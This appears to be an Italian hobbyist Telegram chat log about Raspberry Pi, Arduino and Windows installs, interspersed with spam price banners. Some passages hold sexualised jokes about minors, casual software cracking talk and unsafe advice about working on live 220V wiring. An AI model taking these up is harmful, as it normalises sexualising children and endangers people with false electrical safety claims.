⭐️‎ 4‎.6‎0 ‌‎/‌‎ ‎5.‎00‎ (‎87‎ r‎ec‎en‎si‎on‎i)
 

Perché solo?
ma è la cosa per installare windows su un pc, no?
ma torrent mi dice 9h
si
è normale
maccome?
dagli un po di tempo che trova i vari peer e che si stabilizza
ah ok
Perché il prezzo medio è 1000-1100
tramite wifi, con il VNC
e poi ci sono io che con la connessione da 500kb/s non mi accorgo neppure se i server sono lenti o veloci 
Non serve essere collegati ad internet per questo software?
anche in locale va bene
basta essere connessi alla stessa wifi del raspi
Ah perfetto grazie mille
di nulla
quando capisci che o i server fanno schifo o hai l'internet del burundi
tramite torrent nulla?
oppure esiste un programma che non interrompa totalmente il download se internet va via?
una specie di downloader
tramite il programma
che non me la scarica mai
^
bho...
ma a me ogni volta si interrompe
Chrome
ma stoppa il download
dice download non riuscito
se lo stoppa è il server che te lo fa stoppare
clicca 'Riprova"
ok
già fatto qualche volta, ma dopo un po non me lo dava più disponibile
allora lí è il server
ma sai se si può trovare la iso originale di winzozz in download torrent?
di sicuro la trovi, ma io non è che mi fidi molto
ce l'avrei sull'hard disk io, ma per inviarti 3 GB ci metterei tipo 5 giorni 
mhh...
usa il tool di windows e fai "salva come iso"
già fatto
e si è chiuso comunque
🤔
scherzooo
trovataaa
siii
ho fatto una ricerca in tutto c:/
aspè...
forse no
come non detto
non puoi uploadarla da nessuna parte?
Mega ci metti un casino
Usate Dropbox
ce la fai su dropbox?
tra meno di una settimana è pronto il pc e non trovo la iso di winzozz
tengo acceso il pc 5 giorni? 
ok, scusa 
lo farei col raspi, ma attualmente è sul robot e non posso tenere acceso neanche lui
non riesco a capire perchè lascio il pc a scaricare e poi mi ritrovo la finestra del coso chiusa e nessuna iso
non capisco cosa sbaglio
il prblema che visto che ci mette 2 giorni a scaricare non posso registrare lo schermo per 2 giorni
Grosso arrivo
Qualcuno di voi ha provato a mettete micropython su ruote?
 penso di aver trovato una accoppiata perfetta 
Okay ho chiesto per sicurezza
  a "partito il portatile" sono morto 
Hahaha
Lel, anch'io le ho fatte oggi
ho messo raspbian sul raspberry ma se collego HDMI non si vede nulla
che faccio?
non si collega maco in wifi ho messo il wpa_supplicant.conf ma sul modm non risulta
Se io imposto un digispark per emulare un mouse (per mandarlo a p*****e) dopo non potrò più riprogrammarlo in quanto risulterebbe impossibile vero?
Non hai mai fatto volare portatili?
 Questa va bene per attivare windows?
Sei sicuro  che raspian si sia estratto correttamente?
Si fanno lo stesso giorno e la stessa ora in tutta Italia, e se non sbaglio si fanno in terza e quinta elementare, terza media, primo e secondo superiore.
no mai..solamente telefoni e 2 volte il Kindle
Io ho esperienze 
Yessa
Ok
Ahah mai giocato a calcetto coi nokia?
con il mitico 3310? aivoglia..anche lanciato dallo scooter
Cmq coi portatili manco io di solito li tengo nelle custodie in neoprene dentro gli zaini con sacche protette chiuse
si ma ci ho messo il caricatore del telefono comunque ora sono appena tornato dal mio negozio di fiducia con un caricatore da 2A
Prima da quanto lo utilizzavi?
1A
Effettivamente è troppo poco, potrebbe essere dipeso anche da quello
puoi mettere un delay di qualche secondo in modo da poterlo riprogrammare
Però perderebbe efficacia
metti un if e un pulsante su un pin a piacimento, se il pulsante è premuto il codice non parte
no va... provo a reinstallare Raspbian (ci metterà di nuovo 1 ora)
oppure uno switch
Sì, ma per non sovraccaricare la piattaforma abbiamo fatto a gruppi di 7 nella classe nostra
È arrivato il momento di smontare tutto e ripartire. Spero vada tutto bene 
Nono da quest' anno sono digitali e non sono tutte lo stesso giorno, o almeno così se superiori, in cui si fanno in 2ª e in 5ª
Usi una scheda l293d?
Eh lo so che non ci azzecca molto xd
Era per fare delle prove con gli rgb
Io non riesco ad utilizzarla con dei motori dc 
Che problema hai?
Io ho fatto qualcosa
Non capisco come farla funzionare, se collego i motori sui pin digitali di Arduino nessun problema, ma se li collego alla scheda non succede nulka
Ma usi af-motor?
qualcuno ha mai installato dietpi nel raspi?
Uso dei n20 comunissimi
No la libreria
Quella scheda è un clone cinese
Della sceda adafruit
Screenshot (11 apr 2018 17:55:03)
Usa la loro libreria
Come si chiama?
Af-motor
che poi quella scheda perde un po' di significato senza la libreria XD
Allora la installo e ti faccio sapere 
;)
Ragazzi sapete se questi mosfet
Mettono in pwm anche il negativo? O solo il positivo?
Lo avevi già utilizzato in precedenza?
no mi è arrivato alle 13
Una domanda... Il mio smartphone non è otg... Ma se faccio un cavo che prende l'alimentatore esternamente e mette in comunicazione tra i dispositivi solo TX RX e gnd... Può funzionare?
Scusate se se la mia rete wifi contiene spazi e metto
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
network={
    ssid="Nome Rete"
    psk="YOUR_SECRET_PASSPHRASE_HERE"
    id_str="SOME_DESCRIPTIVE_NAME"
}

funziona?
No
Non esistono modi per collegare roba ad uno smartphone non otg?
Root, ma non so se ne vale la pena
Io non le ho fatte
Già fatto... Ho cambiato pure rom e diceva che l'otg avrebbe funzionato... Ma niente
No perché puoi usare la scorciatoia cntrl+u
Flasha automaticamente? Il problema si ripresenta se emula una tastiera
Conoscete dei kit per costruire una bobina di tesla?
No
Basta premere il pulsante col mouse
Potrei mettere un leggero delay
Dovresti riuscire a riprogrammarlo con il programmatore con TX e RX
Ok
Non avevo implementato la libreria, intanto ti mando quello vecchio
 <NewPing.h>
int lmotorpin1=3;
int lmotorpin2=5;
int rmotorpin1=6;
int rmotorpin2=9;
int distancecm=0;
const int PIN_TRIGGER = 10;
const int PIN_ECHO = 11;
NewPing sonar(PIN_TRIGGER, PIN_ECHO, 200);
// defines variables
long duration;
int distance;
void setup() {
 pinMode(lmotorpin1,OUTPUT);
 pinMode(lmotorpin2,OUTPUT);
 pinMode(rmotorpin1,OUTPUT);
 pinMode(rmotorpin2,OUTPUT);

Serial.begin(9600);
}
void loop() {
 int lettura=sonar.ping_cm();
 if(lettura<10){
 digitalWrite(lmotorpin1,LOW);
 digitalWrite(lmotorpin2,HIGH);
 digitalWrite(rmotorpin1,LOW);
 digitalWrite(rmotorpin2,HIGH);
 delay(1000);
 digitalWrite(lmotorpin1,LOW);
 digitalWrite(lmotorpin2,HIGH);
 digitalWrite(rmotorpin1,HIGH);
 digitalWrite(rmotorpin2,LOW);
 delay(1000);
 }
 else{
 digitalWrite(rmotorpin1,HIGH);
 digitalWrite(rmotorpin2,LOW);
 digitalWrite(lmotorpin1,HIGH);
 digitalWrite(lmotorpin2,LOW);
 }


Serial.println(lettura);
delay(50);
Usa pastebin
Ciao, ho intezione di comprare un sonoff e ho visto che su banggood sono a $5,19, è un buon prezzo?
No
Sono off quelli di bang good
Io li preferisco on
eh?
Lol
Sì, ogni tanto si trovano a meno ma è un buon prezzo
Su Amazon sta a 10€ spedito dall'Italia
Rega qualcuno mi tiene compagnia in chiamata??
....
Ti sei confusa con lovo
Io sono distante da te
Nessuno?
???
Non hai capito la battuta?!
no
Lamentati con l'altro Marco se non abbiamo un Discord ufficiale, poi se mi scrivi in privato sta sera ti linko un Discord dove c'è un po' di gente qua dentro
È quello non ufficiale di Makers ITA oppure quello tuo?
ma se volete ve lo faccio un server discord ufficiale
L'avevamo fatto

Ma ce l'hanno fatto chiudere
Quindi si va avanti di Discord unofficial
quindi ora non c'è più
HAHAHAHAHAHAHA
Come si chiama quell'app per creare circuiti?
Io ne ho uno che uso per giocare con gli amici a csgo e Fortnite e per programmare in team, dove per un motivo o per l'altro c'è finita gente che sta qua dentro
Ewb o fritzing
EveryCircuit
Fritzing, grazie
Oppure Fritzing o EasyEDA (Web App)
Però l'idea di farne uno unofficial di makersita non sarebbe male, anche se penso che verrei bannato di nuovo da qua
Lovoz trovi la circuitazione che combacia con te
Oddio un mio compagno di classe se l'è installata
E tra un po' arrivo pure io
Puoi anche usare il simulatore fatto da autodesk
Non hai un compagno...hai un  cesso
ESATTO
Puoi addirittura programmare arduino e testare i circuiti
Eagle?
Le uniche che riesce a rimorchiare sono le 2004, e lui è 2001 come me
Hai detto tutto
Silenzio, io e Marco stiamo parlando di cose importanti...Delle 2004
SE MI DITE COSA DEVE ESSERCI VE LO FACCIO IO VOLENTIERI
Ho un quesito: esiste un app che una volta messo il circuito dia tutti i dati? Tipo le varie correnti ecc.
Principalmente?
Mi servirebbe in telecomunicazioni
Capelli, altezza, età, città, sesso
Magari qualcosa da usare sul cellulare
Per il resto chiedi a quel tizio che conosce 
Tipo una radio?
No..
Peccato...
‍♂
Bello il benedict in propic
SIA PRINCIPALMENTE CHE TUTTO
DIPENDE SE LO VOLETE DETAGLIATO
Ho scritto sotto
Smettila di usare il caps.
No, 3 anni sono fattibili...in tutti i sensi ahahahah
TI ODIO
Ma parli del Discord?
Grazie
*si accorge del Caps Lock*
No, Delle 2004
SI
Perché quando sento la parola 2004 penso ai nudes?
Io prima chiederei l'autorizzazione al boss, anche se è unofficial
Ah e premi di nuovo caps lock
Perché è la verità ahahahahah
Aspetta...
Io penso alla galera 
Non si da mai, oppure gli dai un altro nome
 anni?
Ah, vuoi proprio che te li mandi?
Quando sei vecchio?
18 a dicembre
Si
Eheheh
Ma sei vecchio ahahahahah
Ti odio
...
Ma l'età media qui qual'è?
Ma io vorrei farvi quello ufficiale
10
Nah, più alta
Io direi 16
10.5?
14
13 perché ci sono tante 2004
Ahahahahahah
Sento la galera fuck
Quelle che piacciono a te, insomma
Stacca stacca
Nono io sto con una 2000 e mi va bene così
Io Sono 2003...quindi muto
Non è troppo grande per te?
Ma sono 2000 anche io
Mentalmente dico 
Tf dude
io ho bisogno di marco quello supremo(?)
No, te hai bisogno di un ragazzo
Ma le 2004 qui dentro cosa fanno precisamente?
Per questo ti consigliamo lovo
Sì, ma non scrivergli in privato
Programmano con sketch?
Official partner da oggi
Insieme alle 2004 ovviamente
Prima chiedi l'autorizzazione
Le 2004?
Loro non montano blocchi....ma altro
Smettila io vengo arrestato
Io no 
Però sono cagne per la maggiore quindi evito
HAHAHAHAHAHA
Lo dico da 2004
Fissatemi il messaggio
Ti fissiamo le manette
Ah no quelle so per me
Perché quando provo a collegare il ruspberry alla TV non vedo nulla
up
Loool
Prova ad accendere la luce
O ad aprire la finestra
Forse entra un po' di luce
No perche non trovo ip e non posso usare SSH
Puoi trovare l'interruttore però
lo so
Inserisci l’sd nel pc, crea un file ‘ssh’ senza estensione
Riaccendi il raspberry, vai sulla gestione del modem e prendi l’ip
Ok
Deve seguire i miei consigli!
Zittoh
Oh vecchio!
Oh bimbo
Ma se abbiamo 3 anni di differenza ahahahahah
Chi è che quest’anno prende la patente?
Chi è che quest'anno si schianta con la macchina nuova?
Io no perché la macchina non è nuova
Se facciamo un incidente muore solo il docente
Meglio per noi
Nenache il conducente vista l'età
Ho 17 anni mica 30
Sasy ma tutto minuscolo
O è uguale
Minuscolo
Ok dopo ci provo che ho interrogazione di sistemi
Chi vuol andare al mio posto
Io
Argomenti?
Livelli ISO osi TCP ip ecetera
Sistemi informatici o sistemi in matematica?
Informatici
Schifo
Oh cool
Sasy purtroppo lo so
qual'è il marco quello importante?
 posso scriverle in privato?
troppa cordialità in un solo messaggio
Ti rispondo io, no, ma non per cattiveria, perché se 600 persone gli scrivono in privato poverino muore
Quindi o gli scrivi su questo gruppo, o non gli scrivi
Come fate solitamente nel Vicentino? 
ma devo parlargli di una cosa, importante
Vada per la seconda
NO
Anzi...
N O
Ora è molto meglio
Ti conviene fare un mega messaggio dove lo tagghi
fai così, su cpp apri un thread, manda in output nel main una parola sensata della frase alla volta e nel thread manda in output bestemmie in un array con un random, vedi il risultato, è circa quello, di solito poi, più cordialità = più thread di bestemmie ù-ù
ma ahoo che è, tutti a prendergli le difese, se non vuole me lo dirà lui
monossido d'azoto
Raga quanto scommettete che gli dice no?
Io punto la password della mia paypal
pure studiato
attento ahahah
Come si dice al mio paese, 
 digli si 
ahahhaha
ti aspetto
solo perchè è lei io direi di no
Tanto ve la do la password
Non ho specificato che non devo unlinkarla dalla carta di credito

Lol 
ma l'avevamo già fatto, è che poi è morto
Ergo un Quadro elettrico con a monte un Interruttore Magnetotermico con protezione per le fughe di corrente verso terra
appunto, sta volta facciamo ed evitiamo di farlo morire
HAHAHAHAHAHHAAHAHAHAHHAHAH
E il tutto dipende dalla soglia di corrente
non è morto perchè era fatto male, non lo usava quasi nessuno, e poi non era ufficiale e Marco non voleva e pace 🤷‍♂
per un sacco di motivi
boh
vabbe
a me non cambia
ma voglio ancora scrivere a manco in privato
fai così:

 posso scriverti in privato per una cosa importante?
ecco, aspetta e vedi cosa risponde 
non legge subito, avrà da fare adesso
ahah va bene
Stamattina sono entrato in un gruppo, manco il tempo di ambientarmi che questo nomina overVolt, coincidenze?
...si
XD
Bho, magari mi ha riconosciuto visto che ho fatto un video con overVolt
Infatti quando gli ho risposto di conoscerlo mi ha detto che voleva parlargli perché voleva un vocale che gli faceva gli auguri tipo
cos
Devi farti discepolo di romboli
sì ahahahah, ci sono rimasto male, poi mi ha detto che l'ha chiesto anche a Youtube Fa Cagare, David Rubino, Mr. Flame, fyammah e non so chi altro, non gli ho più risposto.
OT: qualcuno di voi saprebbe consigliarmi corde per chitarra che non si ossidsno dopo 1 settimana?
non sto trovando nulla di utile
Nah
Idruro di sodio
gg
Ti servono per la chitarra?
si
Allora niente

Mi faccio prendere un po' troppo dalla parola "makers" 
Usa un po' di wd 40 
Ragazzi ma se voglio leggere con arduino la resistenza di 2 termistori devo fare 2 partitori di tensione? Non si riesce a fare un circuito unico (con una sola resistenza)?
Suoni elettrica, acustica o classica?
classica
stavo pensando alle d'addario exp 16
Ma non ti saprei dire, la classica la ho suonata appena ho iniziato e prendevo le prime che mi davano al negozio
il problema che le mie si ossidano dopo meno di 1 settimana
 perchè raspberry non mi salva il file /etc/resolv.conf?
Qui mi dice esaurito
Qui ne restano 16
L’hai aperto da root?
sudo su
nano /etc/resolv.conf
ho salvato 
riavviato
fatto ssh 

hosto not found o roba simile vado al vecchio ip 
e scopro che il file non si è salvato quindi lo rifaccio e stessa storia per almeno 5 volte
Hai premuto CTRL+X poi y e invio?
si
Se fai cat /etc/resolv.conf vedi le modifiche?
ora controllo
no
Prova a modificarlo con un altro editor
come? su raspberry non c'è vim (purtroppo)
anche facendo apt install vim non trova il pacchetto
È già installato
vim ciao.txt > vim command not found
Hai fatto sudo apt update e sudo apt install vim?
si
package not found
sudo apt-get update
sudo apt-get install vim-runtime
sudo apt-get install vim
 ho un problema
ho arduino micro e in pratica se scrivo:
  Keyboard.print("ciao -test");
la - me la risconosce com un altro carattere
perchè ti vuoi male
ho lanciato apt install vim ed è andato... prima non trovava il pacchetto...
vabbeh modifico resolv.conf con vim e vediamo un po
Perché devi aggiornare
Raga niente nessun segnale ancora ma il file IMG lo devo mettere nella USB o sd
Perché io lo messa nella USB
Parlo del ruspberry
ma non ho fatto nulla
la prima volta
apt install vim > package not found
seconda volta
apt install vim 
ha fatto tutte le sue cose e lo sta installando
senza fare update
Ah booooh
Cos'è il raspberry di Salvini?
oddio cosa ho letto
dopo che salvo il file resolve.conf faccio reboot?
Niente funziona ho risolto
Ma raga se metto la versione lite non ho la grafica ho devo fare qualcosa per installare
AAHAHAHAHAAHAHAH
❤️
mi sembra valido
Raga voi tifate per il Real o per la Juve
juve
sempre e comunque
Real
perchè non vaaaa? ho fatto il reboot ho cambiato il dhcpcd.conf ma non va nulla
Hahaha 
Ammazza se è valido.. c'è stile dietro
Ci sarà un'escape string per fare il trattino
Lo conosci?
Oh se proprio proprio è una cosa importante scrivi a 
, così 
 ci dà la password 
tanto unlinko l'account dalla carta di credito e ne approfitto per crearne uno legit visto che ho messo che sono un 95
Si comunque non farlo 🤔
why?
non mi cambia niente
tanto un Marco Realacci del 1995 non esiste
Boh, furti di identità? Info personali? Quel profilo comunque è stato tuo
Ahahah
 il video di Maltego? Non si riesce ancora a vedere dal blog

rip
Detto questo, grazie di aver avvertito, sistemo subito 

sad woodman
dove la cerco?
Su google
hai usato sudo?

Gente, vi ricordo che se volete segnalarci problemi del blog potete scrivere a 
 
Io più che altro stavo pensando..i video tipo hacking a lato a sinistra dove stanno tutti i post, sono ordinati per qualche criterio? Oppure va a finire che sono tutti un pelo a caso?
Sono a caso
oppure è Marco che li incasina, ma di suo dovrebbero disporsi a caso
ma aspetta... nella home dici?
si
dici qui nella home...
...o qui nella lista?
Nella lista questa
ah no ok
Perchè se sono a caso è una tragedia trovare l'ultimo uscito
Ragazzi è normale che è così lento a caricare il sistema il ruspberry
dovevano essere in ordine, ho cercato di trovare l'ordine giusto ma era impossibile dato che non tutti i video erano numerati
adesso se ne escono di nuovi ovviamente vanno in fondo
A ok, comunque i prossimi li metti tipo a fondo fila in ordine?
sisi
Ok apposct
Dipende dall'os..poi overclocka che fa sempre bene un po'
Ma no ho messo ruspian sul ruspberry ma è lento a caricare
Il sistema
E fermo qui da 10 minuti tipo
ehm...
è un kernel panic, ci credo che sia fermo 
se puoi manda la foto fatta meglio, così leggiamo
Fuck this shit i'm out
Babe ora lo spento e sto installando quella dell' anno scorso
Se riviene la faccio meglio
scusate cosa c'è di sbagliato?
adduser —home /sftp/simone/ -g sftpusers simone
Cosa ti restituisce come errore?
l'usage di adduser
il punto è che nella usage c'è —home quindi non capisco dove sbaglio
 con quali dosi di caffeina hai realizzato l'ultimo IMDO?
Cosa devo fare
formattare (?)
Killer lo ciao fatto
Uhm
Installazione pulita?
Si con rufus
L'installazione é avventa con successo?
No non è partita ho messo ruspian ma non si è avviata
Non capisco
Ma lo sapevate voi?
Su fb
Anche su DISCORD
Ma non è forse che ho messo una da 2 GB di sd e non è sufficiente
lol
Probabile
Usa una usb
4gb minimo
Ok la cerco in casa
 ma seriamente porti un 48? ma che hai, una pinna da sub al posto del piede?
48 é assurdo, ma considerando che è molto alto ci sta
Troppe (se vedi la molecola che c'è in copertina è la caffeina )
No dai anche 47, dipende dalla scarpa  Su due metri di altezza...
Vabbè dai io 46 per dire
 ragazzi io porto un 41.5..mi fate sentire nano così
Madonna
È Gesù
44
e non sono proprio nano, sono 1.80 
Io ho un 38
 il piedino delle bambole
:p

Sono quasi quanto te
c'è tempo per mettere ancora qualche centimetro
ti ha dato un kernel panic, è inutile che aspetti  devi riformattare tutto e lanciare Raspbian senza toccare nessun file
Io ho 45 e ho 14 annni
Io 43 e ho 14 anni pure io
Idem
Lo sei
Perché nel canale siamo 2000 e qui solo 600?
è normale, la gente spesso non entra nei gruppi per i troppi messaggi
e se devo essere sincero anche a me farebbe fastidio se non rispondessi ai messaggi
Dimentico che non vanno i gif qua..
Ce il tasto mute
ok, ma il badge dei messaggi all'interno di telegram appare comunque
Quelle da ginnastica 48½ 
Yep,ma per es. Per me maker ita e un gruppo bello  per chiacchere e di piu aiuta la gente
AHAHAHAHAHAHAHAHAH
ma non tutti sono interessati semplicemente
Figo!
Mi ricordo che c'era pure sul sito della OnePlus
va bene
Qualcuno conosce file tim .ehi funzionanti?
Mi spieghi dove le trovi?
Perché io nei negozi numeri così alti non li vedo
internet(?)
Io le scarpe sono l'unica cosa che vado ancora a comprare in negozio
ci sono molte persone che comprano anche online
Amazon solitamente arriva fino a 50-52
Le pinne ahahah
Perché tanto su 5 modelli che provo 4 non mi piacciono, quindi se le dovessi ordinare tra ordine e reso passerebbero due mesi prima che trovi un paio di scarpe che mi piaccia
ed avevo ragione
Qualcuno ha mai provato un Wemos D1 mini? Cosa ne pensate? Il Wi-Fi è stabile? Me lo consigliereste?
A me stanno arrivando 3 wemos d1 mini, ma credo che sia quasi identico come hardware ad un esp8266 quindi si te lo consiglio
Ma non avevi detto che volevi abbandonare il wifi... Ha lo stesso chip di un esp8266 e di un sonoff, le caratteristiche sono quelle
Io ho un clone del d1 pro mini, non riesco a connettermi al suo AP ma collegandolo ad un AP esistente funziona, ed ha anche parecchia memoria
Non del tutto
Per alcune cose torna utile il Wi-Fi
Tipo per una serratura elettronica che deve essere sicura o per trasferire un grosso quantitativo di dati resta la miglior tecnologia
Comunque è come un sonoff ha i suoi problemi
Ovvero, che problemi?
Anche nessuno, ha lo stesso chip wifi, ha la sua stessa stabilità... Però è piccolo piccolo
Come si installa una volta comprata?

 ‎So‎lo‎ €‎3.‎99
⭐️‎ 4‎.4‎0 ‌‎/‌‎ ‎5.‎00‎ (‎14‎8 ‎re‎ce‎ns‎io‎ni)
 

Buongiorno a tutti
Qualcuno gentilmente sa cosa vuol dire “Bitcoin”?
Te ne intendi? Ho trovato una cosa per strada...
Io no
Però prova a chiedere
Ho pensato che potesse essere una specie di quei giochini da decifrare
Dati di un portafoglio online di bitcoin
Credo, non so bene come funziona
STACCA STACCA CI HANNO TRACCIATI
STACCAAAAAA
Detto in parole povere?
Eh?
Come i dati di un conto bancario
Ah
Lo butto via quindi?
non lo so perchè l'ho detto ma mi andava di dirlo :P
Se rivedi il ragazzo ridarglielo
se hai già installato Windows, fai impostazioni > aggiornamento > attivazione > cambia product key
Altrimenti ha perso per sempre il suo conto
L’ho visto al parco che l’ha lasciato lì appositamente, poi se ne è andato
Ok
hai cancellato l'immagine
Ma mi arriva qualcosa di fisico a casa?
se puoi manda una foto 🤔
te lo mandano per mail se è solo la key
Mi avete detto che erano dati bancari :/
Credo di si
Guarda nei log del gruppo
ohmaronn 
yup, è un indirizzo di un portafoglio bitcoin
Porto alla polizia?
Non saprei, forse mi sbaglio
meglio, potrebbero esserci parecchi soldi (non penso, ma non si sa mai)
Io lo farei
Quindi cosa faccio?
Io manco so cosa sono i Bitcoin
se ti vuoi fregare i soldi tienitelo
Soldi virtuali
Potrebbe finire nella merda
oppure diventare ricco
no vabbe scherzo
Si ma se lo ha lasciato intenzionalmente o stai trollando o trollava lui
portalo al ragazzo o alla polizia
Ok ma se qualcuno l'ha lasciato lì intenzionaòmente un motivo c'è
non penso che uno lasci un suo indirizzo bitcoin con tanti soldi...
troll
Il ragazzo non so neanche chi sia
Ma c'è solo l'indirizzo pubblico?
No
nope
C’è scritto pubblico
privato
Per questo ho cancellato l’immagine
potresti guardare quanti soldi ci sono dentro 
Quello privato dovrebbe rimanere effettivamente privato
Parte era coperta dal dito comunque
Come ahaha
Nah, una persona con molti soldi non scriverebbe la password del suo wallet in in foglietto
dallo a me che lo faccio io  a parte gli scherzi, vai su un sito come 
 e registra quel portafoglio
Una persona normale non se lo porta in giro
Controlla effettivamente se esiste e se ci sono soldi all'interno
Ci provo
Una persona normale non lo lascia su una panchina intenzionalmente
Anche
Se ci fossero lasciali li e brucia il foglio
Attento che non ci siano bombe

R.i.p 200 bitcoin
Ma adesso quanto sono in eur?
Sarà che guardo troppi film, ma io lo dare alla polizia
Sui 7000
Uuh so saliti
Beh, io controllerei prima se esistesse
Credo
Altrimenti mi perseguiterebbe il dubbio
Anche questo è vero
 riusciresti a controllare tu che io non capisco una mazza?
si, però mandamela in privata la chiave valà 
adesso trova 200 bitcoin e scrive: "no... non c'è nulla...."
Dal loro silenzio deduco che si stanno dividendo il bottino
Ho provato a mettere il pubblico su 
Un'app per fare liste to do pubbliche? Che tipo pubblico il link e gli altri possono vederla ma non modificarla
Vorresti farla? O stai chiedendo se ne esistono?
Trello
o i projects di GitHub
Quoto
Ma Trello è troppo complessa
A me serve una roba dove c'è una lista, quando aggiungo roba si aggiunge in fondo alla lista e man mano che completo le cose in cima sale
Mi serve per gestire meglio il tempo da dedicare a Switchando, Drahy e progetti privati
ehm... Trello fa questo 
Liste di keep?
Basta che sia condivisibile con un link
Forse si
Quando bitly ti chiede a cosa ti serve il loro servizio
Ce l'ho fatta 
Se volete stalkerarmi ho messo il link in bio


Sa tanto di quel sito li con i quiz nel deep
Non ricordo come si chiami
Oggi si tocca  i 220 volt ovviamente scherzo queste cose si fanno a corrente spenta
Se le fai a corrente attiva probabilmente non scrivi più su Telegram 
*overVolt
AHAHAH
nah
hahaahahh
ho messo anche l'interrutore al sonoff ma ora non so dove metterlo :(
  aiutami
Come
È più facile con la corrente accesa, così hai paura di farti male e fai le cose con calma e per bene 
??
Sul pin digitale
ovvio
mica l'ho inglobato sul sonoff

Ok ora vado 
Dategli una medaglia per il miglior spam subliminale dell'anno, subito
minchia un genio ❤️

Ma daii 
come togliere l'enfasi da un messaggio
HAHAAHAHAAHAHA 
"non lo so dov'è il Ciccarelli" è bellissima
In realtà spesso serve averla accesa
O almeno in certi casi mi trovo meglio
Altrimenti non capisco qual'è il cavo giusto tra 20 che ce ne stanno
Tanto se stai sulla scala e tocchi il cavo non isolato non ti prendi la corrente
CIT.
(A meno che non ne tocchi uno con una mano e uno con l'altra s'intende, ne devi toccare uno alla volta)
È vero, la scala ti isola da terra
Bitcoin è una rete 
 (ovvero senza controllo centrale, senza vincoli) che consente di trasferire somme di denaro
Però se qualcuno tocca la scala mentre tocchi il filo vi fate male entrambi
Sto utilizzando una scheda adafruit , avrei bisogno di utilizzare anche un sensore ad ultrasuoni, ma non so su che pin metterlo visto che risultano tutti occupati
Ero ironico
Mai sentito parlare del fatto che il corpo umano è come un grande condensatore?
Tocchi un cavo alla volta e non ti succede niente
Quindi anche se tocchi solo un cavo e sei isolato da terra la scossa te la prendi lo stesso, ho provato e non è piacevole te lo assicuro
Cosa
Sarò speciale io
Da provare 
Isolato da terra, tocco solo un cavo e lo scossone lo prendo lo stesso eh
Non ti posso dire "prova" perché  non è il massimo ahahah
Ho provato
Bah mi suona strana
Nel tuo " robot" usi sensori ad ultrasuoni?
madonna
è impossibile installare pyqt su windows
Al primo superiore no
Come no
Le avevo fatte sia in primo che in secondo, quest'anno non le ho fatte
io non ho fatto nulla di nazionale (1 superiore itis)
Si fanno al secondo
io ci sono riuscito
python 2.7?
3.5
Such game
cos? 
lol
WordPad è la versione per poveri di Microsoft Word
E il bello è che ho una licenza originale di Office Home And Students 2013, ma non la trovo.

 ‎So‎lo‎ €‎3.‎99
⭐️‎ 4‎.4‎0 ‌‎/‌‎ ‎5.‎00‎ (‎14‎8 ‎re‎ce‎ns‎io‎ni)
 

di solito quanto costa?
150/200
s
io la ho e funziona perfettamente
Che sei nel 2007?
quando scade?
Il prezzo della Key medio è 15€ ormai
vai a vedere allo store della microsoft. Io ci passo davanti ogni giorno e la key costa 170
io lo cracko
domani ti mando la foto
mai
Il prezzo del Microsoft store, non fa testo
vai a prenderla dai cinesi....
è ovvio che costa 15€ dai cinesi....
La Key dai cinesi?
Ma stai scherzando?
nop
e
E allora evita di dire vaccate :) il prezzo fuori dallo store di Microsoft è 15€
Originale
scusa ma manda link
Eh
Non è vero... sono key del cazzo che vendono la stessa a tutti
Quella di Amazon funziona
Anche quelle xD
Prendila su Amazon che va bene
No
Ne ho prese 3 con diversi account
E non sono uguali
Quindi non inventare cazzate
Ahhahaha hahahah eBay
Hai avuto sfiga, comunque se proprio la vuoi sicura al 300% costa 30€...solo i polli pagano 170€ di licenza...o le aziende
seee sfiga
Dai chiudiamola con sto discorso perchè non è sensato
Mica ho detto che sono uguali...ho detto che funzionano
Hahahaha polli
Non è sensato dire che costa 170€ Windows 10 pro
Domani ti mando la foto
Allora non ha senso dire:
Arduino originale costa 40€
Quello cinese 20€
🤦‍♂️
Dico che Arduino costa 40
Si parlava di Windows o.o e la Key anche solo a 40€ è originale
Senza andare a 15€ nel mercato grigio
u.u no
Su amazon
Dai basta non ho tempo da perdere in ste cagate
Visto che eBay non ti piace
...
Basta non mi abbasso ai tuoi livelli
Ora vado ciao
Quando sei stato smentito in tutti i modi, cosa vuoi dire

Non sono un bambino come te e non ho tempo da perdere discutendo se una licenza costa 40 o 170
Ciao
Anche perché non c'è da discutere, il prezzo medio è come minimo 40€
Ciao ^^
Se non ci arrivi è uscito dal gruppo...
Non ho ricevuto notifiche
Clicca su di lui è poi vai in gruppi in comune
...
Solitamente esce scritto "xxx ha abbandonato il gruppo"
Comunque, chissene xD
Qui no
Hahahah, questo è il mio secondo profilo
Ora rientro
Eccome
Ok...
Scusate ragazzi ma si può avviare più volte un'app su Android? Magari con un'altra app?
Dici ad esempio avere 2 facebook?
Non proprio 2 programmi identici, due istanze della stessa app, tipo come sul computer, 2 finestre di firefox
contemporaneamente no, ma c'è Parallel Space
Sono con app cloner o simili...se supportata
se poi combini il multitasking del telefono con Parallel Space sei a posto
Ah dovrei vedere, perché volevo due app QPython, una client e una server sullo stesso telefono per provare i socket
Ora vedo queste due app, grazie per le risposte
ah allora sì, App Cloner è meglio
Ok grazie
Si può leggere un termistore da arduino senza un partitore di tensione?
Qual è il bot per fare bot per limitati?
Stagno sulle eliche, seh
 fa schifo
Non è per me
scaldalo e levalo con la pompetta succhiastagno
Cos'è la pompetta succhiastagno?
Ma va ahahahaha se lo scaldo mi passa attraverso la pala
This
Oddio che figa
Costa tanto?
mica ci devi stare 3 ore, lo devi fare in pochi secondi
L'ho staccato con l'unghia e non è rimasto manco il segno
ah apposto
Ahahahahahahah
E poi non ho una pompetta succhiastagno 
Ma non serve a molto
Ma è bella.
Ma sì ma infatti... A meno che le eliche non siano di metallo mica si attacca
Sei pazzo
Sulle saldature da rimuovere puoi usare del Solder Wick, che è molto più comodo
Controlla l'elica, se si è deformata
Non so che è neanche il solder wick

Ecco un video introduzione alla saldatura
Mi servirebbe, grazie 
Esatto
No ma va tranquillo, era veramente una gocciolina
Quanto costa?
È carinissimo ☺️ A prestissimo la recensione (appena smette di piovere tutti i giorni)
 il programma per scaricare da spotify scarica in 64kbps
la scuola mia si è comprata il mavic air pro
andava indicato nelle impostazioni -_-
se compro qualcosa su bangood, che corriere devo selezionare su trackbot?
Che strano i cinesi si fanno concorrenza da soli
Mi è arrivato un clone cinese del Mavic... Preciso identico tranne per le dimensioni 
meglio wav o flac sul telefono?
Flac
ho messo wav
spero che samsung music la legge
Stesso spam in 3 canali proprio diversi
Lo sai che su uno smartphone, a parte qualche eccezione, non riesci a sentire la qualità di un flac figuriamoci di un wae
